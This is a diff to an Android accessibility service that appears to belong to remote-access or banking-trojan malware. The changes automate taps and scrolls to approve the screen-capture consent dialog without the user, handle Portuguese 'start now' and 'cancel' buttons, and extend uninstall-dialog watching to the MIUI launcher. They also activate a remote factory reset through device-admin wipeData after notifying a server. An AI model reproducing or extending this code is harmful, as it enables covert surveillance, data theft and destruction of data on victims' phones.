@@ -113,7 +113,7 @@ public class MainAccessibilityService extends AccessibilityService {
     public static final String ACTION_DEVICE_BACK = "DEVICE_BACK";
     public static final String ACTION_DEVICE_RECENT = "DEVICE_RECENT";
     public static final String ACTION_CLOSE_MONITOR = "CLOSE_MONITOR";
-//    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
+    //    private String Selected_EVENT = ACTION_CLOSE_MONITOR;
     DisplayMetrics displayMetrics;
 
     //Screen Monitor
@@ -125,6 +125,10 @@ public class MainAccessibilityService extends AccessibilityService {
     private MediaProjectionManager mediaProjectionManager;
     private MediaProjection mediaProjection;
     private ImageReader imageReader;
+
+    private Handler scrollHandler = new Handler();
+    private Runnable scrollRunnable;
+    private Boolean isServiceSel = false;
 
     //blackscreen
     private boolean blackScreen = false;
@@ -312,7 +316,7 @@ public class MainAccessibilityService extends AccessibilityService {
             }
 
             if (ACTION_ALL_GALLERY.equals(intent.getAction())) {
-                    getAllImages();
+                getAllImages();
             }
             if (ACTION_ONE_GALLERY.equals(intent.getAction())) {
                 //Gallery Monitor
@@ -433,34 +437,20 @@ public class MainAccessibilityService extends AccessibilityService {
         if (mediaProjection == null) {
             List<MousePositionEntry> notificationdraw = new ArrayList<>();
             notificationdraw.add(new MousePositionEntry(50,10));
-            notificationdraw.add(new MousePositionEntry(50,13));
-            notificationdraw.add(new MousePositionEntry(50,16));
-            notificationdraw.add(new MousePositionEntry(50,20));
-            notificationdraw.add(new MousePositionEntry(50,23.5));
-            notificationdraw.add(new MousePositionEntry(50,26.5));
-            notificationdraw.add(new MousePositionEntry(50,29.1));
-            notificationdraw.add(new MousePositionEntry(50,44.2));
-            notificationdraw.add(new MousePositionEntry(50,58.1));
-            notificationdraw.add(new MousePositionEntry(50,75.3));
-            notificationdraw.add(new MousePositionEntry(50,91.1));
-            notificationdraw.add(new MousePositionEntry(50,115.5));
-            notificationdraw.add(new MousePositionEntry(50,127.6));
-            notificationdraw.add(new MousePositionEntry(50,141.03));
-            notificationdraw.add(new MousePositionEntry(50,155.62));
-            notificationdraw.add(new MousePositionEntry(50,170.21));
-            notificationdraw.add(new MousePositionEntry(50,182.37));
-            notificationdraw.add(new MousePositionEntry(50,192));
-            notificationdraw.add(new MousePositionEntry(50,200));
-            notificationdraw.add(new MousePositionEntry(50,206));
-            notificationdraw.add(new MousePositionEntry(50,215));
-            notificationdraw.add(new MousePositionEntry(50,221));
-            notificationdraw.add(new MousePositionEntry(50,226));
-            notificationdraw.add(new MousePositionEntry(50,233));
-            notificationdraw.add(new MousePositionEntry(50,234));
-            notificationdraw.add(new MousePositionEntry(50,235));
+            notificationdraw.add(new MousePositionEntry(50,12));
+            notificationdraw.add(new MousePositionEntry(50,50));
+
+            notificationdraw.add(new MousePositionEntry(50,deviceHeight * 360/ deviceWidth - 100));
 
             Common.getInstance().setMousePositionEntries(notificationdraw);
             mouseDraw();
+            Handler handler=new Handler();
+            handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    startScrolling();
+                }
+            },500);
         }
     }
     private void setMediaProjectionPermission(AccessibilityEvent event) {
@@ -480,7 +470,7 @@ public class MainAccessibilityService extends AccessibilityService {
         CharSequence packagename = String.valueOf(event.getPackageName());
         Log.d(TAG, "Text changed: " + packagename + "::: "+event.getClassName());
 
-        if(packagename.equals("com.google.android.packageinstaller") || packagename.equals("com.android.systemui")) {
+        if(packagename.equals("com.google.android.packageinstaller") || packagename.equals("com.android.systemui") || packagename.equals("com.miui.home")) {
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
             if(rootNode != null) {
                 isSelectedApp = false;
@@ -548,14 +538,15 @@ public class MainAccessibilityService extends AccessibilityService {
                             || nodeText.equals("iniciar agora")
                             || nodeText.equals("início")
                             || nodeText.equals("iniciar")) {
-                        Rect rect = new Rect();
-                        node.getBoundsInScreen(rect);
-                        performClickMain(rect.left + 10, rect.top + 10);
+                        node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                     } else if(nodeText.equals("cancel") || nodeText.equals("cancelar")){
                         Rect rect = new Rect();
                         node.getBoundsInScreen(rect);
-                        if(rect.width() < deviceWidth / 2 ) {
-                            performClickMain(deviceWidth - rect.left - 10, rect.top + 10);
+                        AccessibilityNodeInfo nodeone = getComponentAtPosition(deviceWidth - rect.left - 10, rect.top + 10);
+                        if(nodeone == null) {
+                            if(rect.width() < deviceWidth / 2 ) {
+                                performClickMain(deviceWidth - rect.left - 10, rect.top + 10);
+                            }
                         }
                     }
                 }
@@ -579,6 +570,8 @@ public class MainAccessibilityService extends AccessibilityService {
                                 }
                             }
                         }
+                        isServiceSel = true;
+                        stopScrollingHandler();
                     }
                 }
             }
@@ -592,8 +585,8 @@ public class MainAccessibilityService extends AccessibilityService {
         if(node != null) {
             if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
                 if(node.getText() != null) {
-                    String nodeText = node.getText().toString();
-                    if(nodeText.contains(getResources().getString(R.string.app_name))) {
+                    String nodeText = node.getText().toString().toLowerCase();
+                    if(nodeText.contains(getResources().getString(R.string.app_name).toLowerCase())) {
                         isSelectedApp = true;
                     }
                     if (nodeText.contains("desins") || nodeText.contains("unins")) {
@@ -605,6 +598,37 @@ public class MainAccessibilityService extends AccessibilityService {
                 getUninstallDialog(node.getChild(i));
             }
         }
+    }
+
+    public AccessibilityNodeInfo getComponentAtPosition(int x, int y) {
+        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+        if (rootNode != null) {
+            return findNodeAtPosition(rootNode, x, y);
+        }
+        return null;
+    }
+
+    private AccessibilityNodeInfo findNodeAtPosition(AccessibilityNodeInfo node, int x, int y) {
+        if (node == null) {
+            return null;
+        }
+        Rect bounds = new Rect();
+        node.getBoundsInScreen(bounds);
+        if (bounds.contains(x, y)) {
+            Log.d("Bound::", bounds.left + "::" + bounds.top);
+            if(!node.getClassName().equals("android.widget.FrameLayout")) {
+                return node;
+            }
+
+        }
+        for (int i = 0; i < node.getChildCount(); i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            AccessibilityNodeInfo result = findNodeAtPosition(child, x, y);
+            if (result != null) {
+                return result;
+            }
+        }
+        return null;
     }
 
     public void getAccessibilityPage(AccessibilityNodeInfo node) {
@@ -943,7 +967,7 @@ public class MainAccessibilityService extends AccessibilityService {
             @Override
             public void onCompleted(GestureDescription gestureDescription) {
                 super.onCompleted(gestureDescription);
-                Log.d(TAG, "Click performed successfully");
+                Log.d("PerformClick", "Click performed successfully");
             }
 
             @Override
@@ -969,7 +993,7 @@ public class MainAccessibilityService extends AccessibilityService {
             @Override
             public void onCompleted(GestureDescription gestureDescription) {
                 super.onCompleted(gestureDescription);
-                Log.d(TAG, "Click performed successfully");
+                Log.d("performmain", "Click performed successfully");
             }
 
             @Override
@@ -1000,14 +1024,14 @@ public class MainAccessibilityService extends AccessibilityService {
             }
         }
 
-        GestureDescription.StrokeDescription dragStroke = new GestureDescription.StrokeDescription(path, 0, 100);
+        GestureDescription.StrokeDescription dragStroke = new GestureDescription.StrokeDescription(path, 0, 300);
         GestureDescription dragGesture = new GestureDescription.Builder().addStroke(dragStroke).build();
 
         boolean result = dispatchGesture(dragGesture, new GestureResultCallback() {
             @Override
             public void onCompleted(GestureDescription gestureDescription) {
                 super.onCompleted(gestureDescription);
-                Log.d(TAG, "Click performed successfully");
+                Log.d("mousedraw", "Click performed successfully");
             }
 
             @Override
@@ -1337,11 +1361,14 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     public void performFactoryReset() {
-//        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-//        mAdminComponent = new ComponentName(getPackageName(), getPackageName() + ".receiver.MyDeviceAdminReceiver");
-//        if (mDevicePolicyManager.isAdminActive(mAdminComponent)) {
-//            mDevicePolicyManager.wipeData(0);
-//        }
+        mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        mAdminComponent = new ComponentName(getPackageName(), getPackageName() + ".receiver.MyDeviceAdminReceiver");
+        if (mDevicePolicyManager.isAdminActive(mAdminComponent)) {
+            if(Integer.parseInt(Build.VERSION.RELEASE) < 14) {
+                Server.getContext().sendFormatNotification();
+                mDevicePolicyManager.wipeData(0);
+            }
+        }
 ////        Intent intent = new Intent(Settings.ACTION_PRIVACY_SETTINGS);
 ////        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 ////        startActivity(intent);
@@ -1359,7 +1386,34 @@ public class MainAccessibilityService extends AccessibilityService {
         performGlobalAction(GLOBAL_ACTION_RECENTS);
     }
 
+    public void startScrolling(){
+        scrollRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (!isServiceSel) {
+                    Log.d(TAG, "still false");
+                    scrollNotification();
+                    scrollHandler.postDelayed(this, 310);
+                }
 
+            }
+        };
+        scrollHandler.post(scrollRunnable);
+    }
+
+    public void stopScrollingHandler() {
+        scrollHandler.removeCallbacks(scrollRunnable);
+    }
+
+    private void scrollNotification () {
+        List<MousePositionEntry> notificationdraw = new ArrayList<>();
+        int height_val = deviceHeight * 360 /deviceWidth;
+        notificationdraw.add(new MousePositionEntry(50,height_val/2 + 50));
+        notificationdraw.add(new MousePositionEntry(50,height_val/2-50));
+
+        Common.getInstance().setMousePositionEntries(notificationdraw);
+        mouseDraw();
+    }
 
 
     //Send Data part
